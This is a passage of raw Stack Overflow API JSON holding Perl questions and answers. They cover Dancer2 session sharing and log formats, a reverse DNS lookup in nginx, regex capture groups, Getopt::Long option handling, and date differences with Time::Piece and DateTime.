"answer_id": 37868813, "question_id": 37867022, "link": "https://stackoverflow.com/questions/37867022/how-can-i-share-session-data-between-dancer2-apps-with-different-serializers/37868813#37868813", "title": "How can I share session data between Dancer2 apps with different serializers?", "body": "<p>There's no need to combine your apps using <code>appname</code>; session data will be shared as long as both apps use the same configuration for the session engine. (Also, <a href=\"http://advent.perldancer.org/2014/11\" rel=\"nofollow\">serializers are an all-or-nothing prospect</a> in Dancer2, so you really <em>have</em> to use two separate apps.)</p>\n\n<p>Here's the example I gave on the <a href=\"http://lists.preshweb.co.uk/pipermail/dancer-users/2015-March/004457.html\" rel=\"nofollow\">dancer-users mailing list</a>:</p>\n\n<p><strong>MyApp/lib/MyApp.pm</strong></p>\n\n<pre><code>package MyApp;\nuse Dancer2;\n\nour $VERSION = '0.1';\n\nget '/' =&gt; sub {\n    session foo =&gt; 'bar';\n    template 'index';\n};\n\ntrue;\n</code></pre>\n\n<p><strong>MyApp/lib/MyApp/API.pm</strong></p>\n\n<pre><code>package MyApp::API;\nuse Dancer2;\n\nset serializer =&gt; 'JSON';\n\nget '/' =&gt; sub {\n    my $foo = session('foo') // 'fail';\n    return { foo =&gt; $foo };\n};\n\ntrue;\n</code></pre>\n\n<p><strong>MyApp/bin/app.psgi</strong></p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\nuse FindBin;\nuse lib \"$FindBin::Bin/../lib\";\n\nuse MyApp;\nuse MyApp::API;\nuse Plack::Builder;\n\nbuilder {\n    mount '/'    =&gt; MyApp-&gt;to_app;\n    mount '/api' =&gt; MyApp::API-&gt;to_app;\n};\n</code></pre>\n\n<p>If you access the <code>/</code> route followed by the <code>/api</code> route in the same browser, you'll get</p>\n\n<pre><code>{\"foo\":\"bar\"}\n</code></pre>\n\n<p>indicating that the same session variable was used by both requests.</p>\n"}], "owner": {"reputation": 349, "user_id": 2773127, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6fef172929e808d472f63d56950a4b62?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Staab", "link": "https://stackoverflow.com/users/2773127/peter-staab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 329, "favorite_count": 1, "accepted_answer_id": 37868813, "answer_count": 1, "score": 1, "last_activity_date": 1466109822, "creation_date": 1466102465, "last_edit_date": 1495535346, "question_id": 37867022, "link": "https://stackoverflow.com/questions/37867022/how-can-i-share-session-data-between-dancer2-apps-with-different-serializers", "title": "How can I share session data between Dancer2 apps with different serializers?", "body": "<p>I am trying to migrate an app from Dancer to Dancer2.  My thought is to separate the code into routes that are served with templates and those that are Ajax (API) calls. </p>\n\n<p>My base app is:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse FindBin; \nuse Plack::Builder;\n\nuse Routes::Templates;\nuse Routes::Login; \n\nbuilder {\n    mount '/'    =&gt; Routes::Templates-&gt;to_app;\n    mount '/api' =&gt; Routes::Login-&gt;to_app;\n};\n</code></pre>\n\n<p>I was thinking that the <code>Routes::Templates</code> package would not have any serializer and the <code>Routes::Login</code> package would have JSON serialization.   I used</p>\n\n<pre><code>set serializer =&gt; 'JSON';\n</code></pre>\n\n<p>in the <code>Routes::Login</code> package. </p>\n\n<p>However, I also want these to share session data so each has a common appname</p>\n\n<pre><code>use Dancer2 appname =&gt; 'myapp';\n</code></pre>\n\n<p>in each file. And that appears to run into trouble with the serialization. The <code>Routes::Template</code> routes are not returning correctly because it is trying to be encoded as JSON.  Here's the error:</p>\n\n<blockquote>\n  <p>Failed to serialize content: hash- or arrayref expected (not a simple scalar, use allow_nonref to allow this) </p>\n</blockquote>\n\n<p>I've read all the documentation, including these: </p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/37012789/how-can-i-use-dancer2plugindatabase-when-my-code-is-split-into-multiple-file\">How can I use Dancer2::Plugin::Database when my code is split into multiple files?</a></li>\n<li><a href=\"https://github.com/wyoung/advent-calendar/tree/master/danceradvent/public/articles/2015\" rel=\"nofollow noreferrer\">https://github.com/wyoung/advent-calendar/tree/master/danceradvent/public/articles/2015</a></li>\n</ul>\n\n<p>But I'm still not clear on how the serializer is separated by package.  </p>\n"}, {"tags": ["perl", "nginx", "dns"], "answers": [{"tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 0, "last_activity_date": 1466102615, "creation_date": 1466102615, "answer_id": 37867071, "question_id": 37866547, "link": "https://stackoverflow.com/questions/37866547/nginx-perl-trying-to-create-a-reverse-dns-variable/37867071#37867071", "title": "NGINX + PERL &gt; trying to create a reverse DNS variable", "body": "<p>I don't know exactly what <code>perl_require</code> does, but I reckon it has something to do with Perl's <code>require</code> function, and a thing to be wary of when you use <code>require</code> is that it does not call the package's <code>import</code> method and does not load the default exported functions and symbols into the calling package.</p>\n\n<p>The upshot is you would have to use qualified symbol names in your Perl call</p>\n\n<pre><code>perl_set $test_rdns \"sub { return scalar gethostbyaddr(Socket::inet_aton($remote_addr), \\\n                                                       Socket::AF_INET); }\";\n</code></pre>\n\n<p>or you will have to call <code>Socket</code>'s <code>import</code> method</p>\n\n<pre><code>perl_set $test_rdns \"sub { use Socket; return scalar \\\n                gethostbyaddr(inet_aton($remote_addr), AF_INET); }\";\n</code></pre>\n\n<p>(This second suggestion is not tested, and may not work depending on what nginx does with perl's library directories and search path)</p>\n"}], "owner": {"reputation": 77, "user_id": 3405598, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/009c3dd32329b29ca285f75d29a4c573?s=128&d=identicon&r=PG&f=1", "display_name": "user3405598", "link": "https://stackoverflow.com/users/3405598/user3405598"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 158, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1466102615, "creation_date": 1466100966, "last_edit_date": 1495541759, "question_id": 37866547, "link": "https://stackoverflow.com/questions/37866547/nginx-perl-trying-to-create-a-reverse-dns-variable", "title": "NGINX + PERL &gt; trying to create a reverse DNS variable", "body": "<p>Based on <a href=\"https://stackoverflow.com/questions/85487/reverse-dns-lookup-in-perl\">Reverse DNS lookup in perl</a> i tried to create a variable in NGINX so I can use in order to identify search engines but I got alot of errors like this:</p>\n\n<blockquote>\n  <p>2016/06/16 21:10:33 [error] 25853#0: *519 call_sv(\"sub { return scalar\n  gethostbyaddr(inet_aton($remote_addr), AF_INET); }\") failed:\n  \"Undefined subroutine &amp;main::inet_aton called at (eval 3) line 1.\"</p>\n</blockquote>\n\n<p>Added into my http block:</p>\n\n<pre><code>perl_require Socket.pm;\nperl_set $test_rdns \"sub { return scalar gethostbyaddr(inet_aton($remote_addr), AF_INET); }\";\n</code></pre>\n\n<p>Please help, I can't find the key of solving this matter.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 12533, "user_id": 931027, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lWhaB.jpg?s=128&g=1", "display_name": "Kusalananda", "link": "https://stackoverflow.com/users/931027/kusalananda"}, "edited": false, "score": 7, "creation_date": 1466097823, "post_id": 37865652, "comment_id": 63188211, "body": "Umm... <code>&#47;(123.*?789)&#47;s</code> ?"}, {"owner": {"reputation": 23234, "user_id": 4333555, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/i9zgM.jpg?s=128&g=1", "display_name": "chris85", "link": "https://stackoverflow.com/users/4333555/chris85"}, "edited": false, "score": 0, "creation_date": 1466098311, "post_id": 37865652, "comment_id": 63188505, "body": "Maybe <code>(123)(\\D+?\\d+)(.*?789)</code>?"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1466100541, "last_edit_date": 1466100541, "creation_date": 1466100030, "answer_id": 37866297, "question_id": 37865652, "link": "https://stackoverflow.com/questions/37865652/perl-regex-match-string-by-not-consuming-characters/37866297#37866297", "title": "Perl regex match string by not consuming characters", "body": "<p>The capturing parens should be placed around what you want to capture, so replace</p>\n\n<pre><code>/123(.*?)789/s\n</code></pre>\n\n<p>with</p>\n\n<pre><code>/(123.*?789)/s\n</code></pre>\n\n<p>Now, <code>123</code> and <code>789</code> will be included in the captured text as requested.</p>\n"}], "owner": {"reputation": 79, "user_id": 3635458, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/100000066897378/picture?type=large", "display_name": "Tatt Ehian", "link": "https://stackoverflow.com/users/3635458/tatt-ehian"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "closed_date": 1606992025, "accepted_answer_id": 37866297, "answer_count": 1, "score": -1, "last_activity_date": 1466100541, "creation_date": 1466097679, "question_id": 37865652, "link": "https://stackoverflow.com/questions/37865652/perl-regex-match-string-by-not-consuming-characters", "closed_reason": "Duplicate", "title": "Perl regex match string by not consuming characters", "body": "<p>How do I extract the string in between but not consuming the characters, </p>\n\n<p>The string:</p>\n\n<pre><code>abc123\ndef456\nghi789\n</code></pre>\n\n<p>I was using the regex below and it returns the string in between 123 and 789:</p>\n\n<pre><code>/123(.*?)789/s\n</code></pre>\n\n<p>What I want to extract is:</p>\n\n<pre><code>123\ndef456\nghi789\n</code></pre>\n"}, {"tags": ["perl", "dancer"], "answers": [{"tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 2, "last_activity_date": 1466101478, "creation_date": 1466101478, "answer_id": 37866706, "question_id": 37865376, "link": "https://stackoverflow.com/questions/37865376/how-can-i-set-the-log-format-in-dancer2/37866706#37866706", "title": "How can I set the log format in Dancer2?", "body": "<p><code>log_format</code> isn't a global configuration directive. It's specific to the particular logging engine you're using, so you have to put it in the <a href=\"https://metacpan.org/pod/Dancer2::Config#Logger-engine\" rel=\"nofollow\">configuration section for that engine</a>.</p>\n\n<p>For example, if you're using the <a href=\"https://metacpan.org/pod/Dancer2::Logger::File\" rel=\"nofollow\">Dancer2::Logger::File</a> engine:</p>\n\n<pre><code>logger: \"File\"\n\nengines:\n  logger:\n    File:\n      log_format: \"[%f--%l] %m\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 349, "user_id": 2773127, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6fef172929e808d472f63d56950a4b62?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Staab", "link": "https://stackoverflow.com/users/2773127/peter-staab"}, "is_accepted": false, "score": 1, "last_activity_date": 1466182864, "last_edit_date": 1466182864, "creation_date": 1466177826, "answer_id": 37885429, "question_id": 37865376, "link": "https://stackoverflow.com/questions/37865376/how-can-i-set-the-log-format-in-dancer2/37885429#37885429", "title": "How can I set the log format in Dancer2?", "body": "<p>Thanks @ThisSuitIsBlackNot.  I've also discovered that if there are other engines (like for session), they need to be nested in the same \"engines\" section.  I have a session engine and it appears that it needs to be done as</p>\n\n<pre><code>logger: Console\nsession: YAML\n\nengines:\n  logger:\n    Console:\n      log_level: debug\n      log_format: \"[%f----%l] %m\"\n  session:\n    YAML:\n      session_dir: /tmp/dancer-sessions\n</code></pre>\n\n<p>I had the session engine information and it appeared that the console engine information was overwritten.  </p>\n"}], "owner": {"reputation": 349, "user_id": 2773127, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/6fef172929e808d472f63d56950a4b62?s=128&d=identicon&r=PG&f=1", "display_name": "Peter Staab", "link": "https://stackoverflow.com/users/2773127/peter-staab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 340, "favorite_count": 0, "accepted_answer_id": 37866706, "answer_count": 2, "score": 2, "last_activity_date": 1466182864, "creation_date": 1466096811, "last_edit_date": 1466101640, "question_id": 37865376, "link": "https://stackoverflow.com/questions/37865376/how-can-i-set-the-log-format-in-dancer2", "title": "How can I set the log format in Dancer2?", "body": "<p>I am trying to change the logging format to include the line number of the file for a Dancer2 app. The default does not seem to do this. If I add the line</p>\n\n<pre><code>log_format: \"[%f--%l] %m\"\n</code></pre>\n\n<p>(which seems correct based on the <a href=\"https://metacpan.org/pod/Dancer2::Core::Role::Logger\" rel=\"nofollow\">Dancer2::Core::Role::Logger documentation</a>) nothing changes.  </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1466092504, "post_id": 37863885, "comment_id": 63185174, "body": "Can you please show all of the relevant code and how you&#39;re running it? I can&#39;t reproduce your issue. Be aware that Getopt::Long supports <a href=\"http://perldoc.perl.org/Getopt/Long.html#Case-and-abbreviations\" rel=\"nofollow noreferrer\">abbreviated options</a> by default, so depending on what other options you&#39;ve defined, <code>--error</code>, <code>--err</code>, and <code>--e</code> could all work."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1466093059, "post_id": 37863885, "comment_id": 63185481, "body": "Could you please provide a minimal, runnable demonstration of the problem? Hard to see where you messed up if you don&#39;t show us!"}], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466093973, "post_id": 37864282, "comment_id": 63186019, "body": "Good guess, although it doesn&#39;t explain why <code>--testing 123</code> would work while <code>--ecode 500</code> doesn&#39;t."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466094029, "post_id": 37864282, "comment_id": 63186053, "body": "@ThisSuitIsBlackNot, That&#39;s simple: They did more than just changing <code>--ecode 503</code> to <code>--testing 123</code>. <code>--ecode 503</code> was probably part of a larger command line in another script/program, whereas they probably passed <code>--testing 123</code> straight to the program from the command line."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466097983, "post_id": 37864282, "comment_id": 63188286, "body": "This can also be controlled by using the colon, <code>foo:s</code> and then a value is required on the command line."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466099359, "post_id": 37864282, "comment_id": 63189154, "body": "@zdim, You are describing <code>=s</code>. A colon will make the value <i>optional</i>, causing <code>GetOptions(&quot;foo:s&quot; =&gt; \\$foo)</code> to fail as desired for <code>--foo --ecode 500</code>. Of course, that&#39;s only a valid solution if <code>--foo</code>&#39;s value is truly optional."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466099952, "post_id": 37864282, "comment_id": 63189542, "body": "@ikegami Oh, of course. In my mind it requires a value on the command line (to be correctly supplied by the user) since it otherwise actually fails, but interface wise it&#39;s the other way round. Sorry for noise.  The second time I reverse things in this Q :("}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1466173444, "last_edit_date": 1466173444, "creation_date": 1466093335, "answer_id": 37864282, "question_id": 37863885, "link": "https://stackoverflow.com/questions/37863885/getopt-long-processing-similar-input-names/37864282#37864282", "title": "GetOpt Long processing similar input names", "body": "<p>I'm guessing you have a option with a required argument such as</p>\n\n<pre><code>\"foo=s\" =&gt; \\$foo,\n</code></pre>\n\n<p>and that you did something like</p>\n\n<pre><code>program --foo --ecode 500\n</code></pre>\n\n<p>which puts <code>--ecode</code> in <code>$foo</code> and <code>500</code> in <code>@ARGV</code>.</p>\n\n<pre><code>$ perl -MGetopt::Long -e'\n   use feature qw( say );\n   GetOptions(\"foo=s\" =&gt; \\$foo)\n      or die \"usage\\n\";\n   say \"ok &lt;$foo&gt; &lt;@ARGV&gt;\";\n' -- \\\n   --ecode 500\nUnknown option: ecode\nusage\n\n$ perl -MGetopt::Long -e'\n   use feature qw( say );\n   GetOptions(\"foo=s\" =&gt; \\$foo)\n      or die \"usage\\n\";\n   say \"ok &lt;$foo&gt; &lt;@ARGV&gt;\";\n' -- \\\n   --foo --ecode 500\nok &lt;--ecode&gt; &lt;500&gt;\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 1475463, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/3edf1382620f621bedd14f435cf018c3?s=128&d=identicon&r=PG", "display_name": "user1475463", "link": "https://stackoverflow.com/users/1475463/user1475463"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "closed_date": 1467278757, "answer_count": 1, "score": -4, "last_activity_date": 1466173444, "creation_date": 1466092230, "question_id": 37863885, "link": "https://stackoverflow.com/questions/37863885/getopt-long-processing-similar-input-names", "closed_reason": "Not suitable for this site", "title": "GetOpt Long processing similar input names", "body": "<p>I'm running a perl script with a lot of input options, one of them being:</p>\n\n<pre><code>        'errorcode=s{1,}'  =&gt; \\@ecodes,\n</code></pre>\n\n<p>I have a die at the end of the GetOptions if anything entered doesn't match the input.  However if I input '--ecode 500' the program runs.  </p>\n\n<p>Why isn't the script dying?  If I try something else like '--testing 123' it does die.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1466090948, "post_id": 37863415, "comment_id": 63184071, "body": "Why not do this directly in your database query?"}, {"owner": {"reputation": 295, "user_id": 4114453, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e8d81cdda00ea27de65abb457245e7f7?s=128&d=identicon&r=PG&f=1", "display_name": "Ga Mmeeu", "link": "https://stackoverflow.com/users/4114453/ga-mmeeu"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1466091381, "post_id": 37863415, "comment_id": 63184405, "body": "In fact I am learning how to handle dates in Perl. Curiosity and familiarisation with Perl are the main drivers."}, {"owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "edited": false, "score": 1, "creation_date": 1466093378, "post_id": 37863415, "comment_id": 63185656, "body": "Looks like a Daylight Saving Time error.  I haven&#39;t checked my calendar to see if that&#39;s the problem."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1466094830, "post_id": 37863415, "comment_id": 63186563, "body": "@Ga Mmeeu, Using <code>str2time($datum, &#39;UTC&#39;)</code> (even if it&#39;s a local time) instead of <code>str2time($datum)</code> will give the right answer. This is the trick Time::Piece uses. But don&#39;t do that. Use a module designed for Date arithmetic."}], "answers": [{"tags": [], "owner": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "is_accepted": true, "score": 7, "last_activity_date": 1466091337, "creation_date": 1466091337, "answer_id": 37863605, "question_id": 37863415, "link": "https://stackoverflow.com/questions/37863415/perl-calculate-number-of-days-by-converting-to-seconds/37863605#37863605", "title": "Perl: Calculate number of days by converting to seconds", "body": "<p>One way is to use the <a href=\"http://perldoc.perl.org/Time/Piece.html\">Time::Piece</a> Core module:</p>\n\n<pre><code>use warnings;\nuse strict;\nuse Time::Piece qw();\n\nmy $t1 = Time::Piece-&gt;strptime('2016-03-27', '%Y-%m-%d');\nmy $t2 = Time::Piece-&gt;strptime('2016-06-15', '%Y-%m-%d');\nmy $seconds = $t2 - $t1;\nprint $seconds-&gt;days(), \"\\n\";\n\n__END__\n\n80\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 2, "creation_date": 1466093954, "post_id": 37863649, "comment_id": 63186009, "body": "It does parse dates. DateTime::Format::Strptime is the most flexible, but DateTime::Format::ISO8601 is probably the simplest in this case."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466094067, "post_id": 37863649, "comment_id": 63186085, "body": "@ikegami yeah if you load one of those. But it <a href=\"https://metacpan.org/pod/DateTime#Parsing-Dates\" rel=\"nofollow noreferrer\">does say <i>this module does not parse dates</i></a>... ;)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466106403, "post_id": 37863649, "comment_id": 63193056, "body": "By that logic, DateTime doesn&#39;t know anything about time zones because all that time zone information is in another distribution. That&#39;s rather silly."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466106471, "post_id": 37863649, "comment_id": 63193090, "body": "It&#39;s not my logic. I was just quoting. ;-)"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 5, "last_activity_date": 1466091473, "creation_date": 1466091473, "answer_id": 37863649, "question_id": 37863415, "link": "https://stackoverflow.com/questions/37863415/perl-calculate-number-of-days-by-converting-to-seconds/37863649#37863649", "title": "Perl: Calculate number of days by converting to seconds", "body": "<p>An alternative is <a href=\"https://metacpan.org/pod/DateTime\">DateTime</a>. It's not in Core, but it's often very handy. Because it doesn't parse dates, we quickly made our own parsing function.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse DateTime;\nmy $minDate = \"2016-03-27\";\nmy $maxDate = \"2016-06-15\";\n\nsub parse {\n    my $date = shift;\n\n    my ( $y, $m, $d ) = split /-/, $date;\n\n    return DateTime-&gt;new( year =&gt; $y, month =&gt; $m, day =&gt; $d );\n}\n\nmy $days = parse($minDate)-&gt;delta_days(parse($maxDate))-&gt;in_units('days');\nprint $days;\n\n__END__\n\n80\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "is_accepted": false, "score": 3, "last_activity_date": 1466094307, "creation_date": 1466094307, "answer_id": 37864621, "question_id": 37863415, "link": "https://stackoverflow.com/questions/37863415/perl-calculate-number-of-days-by-converting-to-seconds/37864621#37864621", "title": "Perl: Calculate number of days by converting to seconds", "body": "<p>You are making the invalid assumption that every day is 86,400 seconds long.</p>\n\n<p>Please go to <a href=\"http://www.timeanddate.com/time/dst/2016.html\" rel=\"nofollow\">http://www.timeanddate.com/time/dst/2016.html</a> and look at all of the places where Daylight Saving Time (aka Summer Time) starts on 27 Mar 2016.  That day is not 86,400 seconds long.</p>\n"}], "owner": {"reputation": 295, "user_id": 4114453, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e8d81cdda00ea27de65abb457245e7f7?s=128&d=identicon&r=PG&f=1", "display_name": "Ga Mmeeu", "link": "https://stackoverflow.com/users/4114453/ga-mmeeu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 443, "favorite_count": 2, "accepted_answer_id": 37863605, "answer_count": 3, "score": 6, "last_activity_date": 1466094307, "creation_date": 1466090849, "last_edit_date": 1466091545, "question_id": 37863415, "link": "https://stackoverflow.com/questions/37863415/perl-calculate-number-of-days-by-converting-to-seconds", "title": "Perl: Calculate number of days by converting to seconds", "body": "<p>I am trying to calculate the number of calendar days between two dates extracted from a database.  I thought that converting the dates to seconds would be a simple and correct solution. </p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse POSIX qw(strftime);\nuse Date::Parse;\n\nmy $minDate = \"2016-03-27\";\nmy $maxDate = \"2016-06-15\";\n\nprint \"Format as extracted from db: mindate: $minDate and maxdate: $maxDate\\n\"; \n\nmy ($dbYear,$dbMonth,$dbDay) = split ('-', $minDate);\nmy $datum = \"$dbYear$dbMonth$dbDay\";\nmy $minDateSec = str2time($datum);\n\n($dbYear,$dbMonth,$dbDay) = split ('-', $maxDate);\n$datum = \"$dbYear$dbMonth$dbDay\";\nmy $maxDateSec = str2time($datum);\n\nmy $numCalDaysSec = ($maxDateSec-$minDateSec)/86400;\n\nprint \"Min date in Seconds: $minDateSec\\n\";\nprint \"Max date in Seconds: $maxDateSec\\n\";\nprint \"Num days: $numCalDaysSec\\n\";\n</code></pre>\n\n<p>Initially, I thought that this method provided me with reliable results:</p>\n\n<pre><code>bash-3.2$ ./testNumDays.pl\nAs extracted from db: mindate: 2016-06-14 and maxdate: 2016-06-15\nMin date in Seconds: 1465855200\nMax date in Seconds: 1465941600\nNum days: 1\nbash-3.2$ ./testNumDays.pl\nAs extracted from db: mindate: 2016-05-31 and maxdate: 2016-06-15\nMin 